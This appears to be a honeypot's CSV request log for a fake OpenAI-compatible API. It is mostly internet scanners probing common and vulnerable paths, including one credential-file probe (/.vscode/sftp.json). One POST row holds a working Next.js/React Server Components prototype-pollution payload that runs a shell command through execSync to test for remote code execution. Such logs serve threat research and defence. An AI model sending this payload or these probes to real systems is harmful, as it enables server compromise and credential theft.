request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
53c6f20c-6ff3-4e91-924d-0244df9c5d0d,2026-03-26T18:43:28.989678+00:00,anon_ed4e7f8c,GET,/p/login/,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
37f921b9-f052-4625-bfc5-64b21e077e99,2026-03-26T18:43:29.962385+00:00,anon_ed4e7f8c,GET,/robots.txt,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
01aef373-348d-48b2-9c0b-52a5c0d71930,2026-03-26T18:43:30.156450+00:00,anon_ed4e7f8c,GET,/api/version,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6f21e024-bcdc-4efb-a044-1bec02fb9645,2026-03-26T18:43:30.291187+00:00,anon_ed4e7f8c,GET,/portal/,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7da9ecec-51f3-4599-ad04-0e8921bd93e9,2026-03-26T18:43:30.627859+00:00,anon_ed4e7f8c,GET,/status,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c547e71b-d956-4d2c-9247-3f7269881e79,2026-03-26T18:43:30.681869+00:00,anon_ed4e7f8c,GET,/info.asp,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
74ce1e53-7c32-4865-9d01-24994ccd6f79,2026-03-26T18:43:30.916585+00:00,anon_ed4e7f8c,GET,/cgi-bin/param.cgi,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c3711b9f-bcf3-4cbd-96b3-7c2369c5d5cb,2026-03-26T18:43:30.970394+00:00,anon_ed4e7f8c,GET,/lms/db,[honeypot-host],Mozilla/5.0 (iPhone; CPU iPhone OS 17_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0bb550cc-7ec5-4bc4-b047-d980ce77cb3e,2026-03-26T18:43:47.327770+00:00,anon_ed4e7f8c,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
bfcfbd8d-a350-4f71-9308-0e5a97860991,2026-03-26T18:47:36.138888+00:00,anon_02e2f139,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",1,
5e9fe579-7977-40d7-9313-3fb17b7b422e,2026-03-26T18:49:45.327890+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
bbc9e265-8d84-4ee8-a5cd-ffa687eb7dfe,2026-03-26T18:50:57.545528+00:00,anon_ac8a3bd6,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
0fb1b950-f108-4faa-97b9-ac18e4d252a6,2026-03-26T18:51:48.040887+00:00,anon_ac8a3bd6,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
6fda765d-8c06-4497-9e9f-5f5c61c3b8c4,2026-03-26T18:52:38.908461+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
df8cd1ed-9f0f-4722-940d-4a649d75784b,2026-03-26T18:52:51.751087+00:00,anon_84e0bec0,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
a51a306c-3bcc-488e-9d5a-5414c7055435,2026-03-26T18:57:11.633620+00:00,anon_d26052ae,GET,/version,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
62f9ae12-9d92-450e-bb97-40a10df9ed00,2026-03-26T18:57:11.754714+00:00,anon_d26052ae,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
fee66157-1899-40cb-beb3-67c5754fe2f1,2026-03-26T18:57:11.864292+00:00,anon_d26052ae,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
a18d8e1f-69ae-4ca4-b95f-44b6a9b8d44c,2026-03-26T18:57:11.980228+00:00,anon_d26052ae,GET,/v1,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d0b4c5b8-ce1e-4f73-94b5-74d04bea792b,2026-03-26T18:57:12.087593+00:00,anon_d26052ae,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
477936d9-1fc0-4fcf-8123-b718c9fc8811,2026-03-26T18:57:12.816977+00:00,anon_d26052ae,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
13f9df22-1f29-4b95-bea9-ff1752dca414,2026-03-26T18:57:12.936524+00:00,anon_d26052ae,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
802820e1-c7ac-4d5a-a171-74b4fcdc37b6,2026-03-26T19:01:01.643662+00:00,anon_02e2f139,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
24c588c0-c195-42a9-8103-59a982e414e8,2026-03-26T19:03:22.763726+00:00,anon_5efd69b7,GET,/,[honeypot-host],Mozilla/5.0,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
df03fe5c-a5fe-4ccf-801e-70d2d2611a07,2026-03-26T19:03:23.213749+00:00,anon_5efd69b7,GET,/_next/static/,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
aa780a2e-d1cb-49d9-acf5-877d2385dd56,2026-03-26T19:07:36.038402+00:00,anon_f99f0909,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
852248ae-233e-44a9-9758-63ec853612b0,2026-03-26T19:07:36.287109+00:00,anon_f99f0909,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd5af7a2-119d-4aef-9c20-122264b26877,2026-03-26T19:07:39.643039+00:00,anon_f99f0909,GET,/login,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
531db239-250d-4c6d-a6dd-cb73c2ad73a0,2026-03-26T19:14:52.086494+00:00,anon_68f91d0c,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
01a8870f-55ab-40d8-992e-b7a601b6f4b5,2026-03-26T19:24:51.553241+00:00,anon_3e9841ac,GET,/portal/redlion,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",1,
7afa492a-0aae-4d92-8631-2023868da27b,2026-03-26T19:50:21.649011+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",1,
27aac672-06e1-493a-b211-b753f1eccdeb,2026-03-26T19:52:09.771220+00:00,anon_b922c63b,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
95717dfe-d458-41d2-8b5d-ab71d457f4c9,2026-03-26T19:52:10.532805+00:00,anon_b922c63b,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fa10a4c8-d8dc-4a2d-b177-7b3b60ed5f90,2026-03-26T19:52:16.863741+00:00,anon_b922c63b,GET,/.well-known/security.txt,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
08ee586d-2a9a-4b5b-b6bd-32e249c302c5,2026-03-26T19:56:32.849465+00:00,anon_02e2f139,GET,/actuator/gateway/routes,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",1,
98041803-7df7-4871-b954-c0c6014c3cd5,2026-03-26T19:58:25.110055+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b05fe0d2-b972-4df3-9c53-4ec82489083c,2026-03-26T20:07:05.574585+00:00,anon_02e2f139,GET,/geoserver,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",1,
cae4c66e-2e0b-42a1-ac26-672463e1ed15,2026-03-26T20:23:00.343599+00:00,anon_3495655c,GET,/.vscode/sftp.json,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",1,
dc5c7925-8f6e-4516-a217-2a4a3d7c6edd,2026-03-26T20:34:55.233075+00:00,anon_df62fa42,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
12ea6343-9303-43c1-9016-d6deb9e3a9bb,2026-03-26T20:35:43.807084+00:00,anon_e7b57d00,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
66c6f784-1731-4302-acd8-de6aa84357f0,2026-03-26T20:35:47.325927+00:00,anon_20558be4,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5b3e3107-3e79-41f2-95e8-2caa950c00fd,2026-03-26T20:41:09.000812+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
924ab9a5-1ef5-4d49-976b-cf482ea2bb53,2026-03-26T20:56:10.068077+00:00,anon_e4abd023,GET,/,,Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",1,
b6b5e843-d6ee-4bad-8475-ff8c1ef30dde,2026-03-26T21:00:04.100455+00:00,anon_e1e5b879,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
ba03e391-6e90-4cc5-be99-53b3c18faf95,2026-03-26T21:03:30.543668+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
157e12de-dc80-42c6-833c-2a26be433dfb,2026-03-26T21:13:05.486520+00:00,anon_68cf686c,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
d5dc505a-c9c4-462c-828b-3bbd127b34f0,2026-03-26T21:30:35.315380+00:00,anon_599b3071,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",1,
018994d2-e491-45f8-9d0a-28763e72ca3c,2026-03-26T21:39:39.735180+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
965eb52f-8259-4153-94f6-69b2754e5651,2026-03-26T21:40:25.889936+00:00,anon_02e2f139,POST,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,854,118,1,,"--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914
Content-Disposition: form-data; name=""0""

{
  ""then"": ""$1:__proto__:then"",
  ""status"": ""resolved_model"",
  ""reason"": -1,
  ""value"": ""{\""then\"":\""$B1337\""}"",
  ""_response"": {
    ""_prefix"": ""var res=process.mainModule.require('child_process').execSync('echo scxfOFpisO|md5sum').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"",
    ""_chunks"": ""$Q2"",
    ""_formData"": {
      ""get"": ""$1:constructor:constructor""
    }
  }
}
--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914
Content-Disposition: form-data; name=""1""

""$@0""
--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914
Content-Disposition: form-data; name=""2""

[]
--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914--
","--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914
Content-Disposition: form-data; name=""0""

{
  ""then"": ""$1:__proto__:then"",
  ""status"": ""resolved_model"",
  ""reason"": -1,
  ""value"": ""{\""then\"":\""$B1337\""}"",
  ""_response"": {
    ""_prefix"": ""var res=process.mainModule.require('child_process').execSync('echo scxfOFpisO|md5sum').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"",
    ""_chunks"": ""$Q2"",
    ""_formData"": {
      ""get"": ""$1:constructor:constructor""
    }
  }
}
--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914
Content-Disposition: form-data; name=""1""

""$@0""
--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914
Content-Disposition: form-data; name=""2""

[]
--54174281bc83742ec00471dd998855e96f259a33eac62b4594ea885f1914--
",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9d756a2a-7322-4db6-afb1-e9ed75c4b886,2026-03-26T21:42:57.237517+00:00,anon_08207003,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
53e98aa4-c3d3-42d4-a1ab-5874a269e514,2026-03-26T21:42:59.290267+00:00,anon_08207003,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bf466690-87dc-4162-bfc9-0e42b1a19bf9,2026-03-26T21:43:08.232889+00:00,anon_08207003,GET,/sitemap.xml,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
10d72bdd-bb52-4620-946d-bdb9f6748eb6,2026-03-26T22:00:56.440209+00:00,anon_bfc6a070,GET,/,[honeypot-host],,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
c91172d3-5020-4ddb-901c-f5bf4b797106,2026-03-26T22:26:42.518883+00:00,anon_095218c6,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d75d9f50-7224-43f1-aa1f-164b9f88a24d,2026-03-26T22:27:42.010154+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
40ab44a9-83c7-4ba5-8295-fa27ee7ff407,2026-03-26T22:32:09.192313+00:00,anon_4217b6ab,GET,/,[honeypot-host],"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36 BitSightBot/1.0",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
1696ddab-81d9-4f29-83df-c72d7ed4fdba,2026-03-26T22:40:25.287622+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",1,
32a338b6-0eef-44ff-ab92-7ade2413eda9,2026-03-26T22:43:02.760926+00:00,anon_02977894,GET,/,[honeypot-host],Mozilla/1.0,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
523d8360-3f33-4b17-8945-9ab4c8e42c08,2026-03-26T22:47:10.067352+00:00,anon_79f9b253,GET,/,[honeypot-host],Mozilla/5.0,,0,170,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""]}
",0,
f47e628a-59bc-4fc1-b05b-806a531e774e,2026-03-26T22:47:10.529718+00:00,anon_79f9b253,GET,/_next/static/,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
